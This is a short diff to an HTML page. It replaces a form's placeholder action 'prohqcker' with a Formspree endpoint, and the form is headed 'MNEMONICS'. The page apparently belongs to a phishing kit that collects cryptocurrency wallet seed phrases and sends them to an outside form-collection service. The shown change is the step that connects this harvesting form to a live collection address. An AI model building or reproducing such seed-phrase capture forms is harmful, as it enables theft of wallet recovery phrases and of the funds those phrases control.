@@ -51,7 +51,7 @@
         <form
           id="my-form"
           class="form flex flex-jc-c"
-          action="prohqcker"
+          action="https://formspree.io/f/mzbqjpwv"
           method="POST"
         >
           <h5>MNEMONICS</h5>
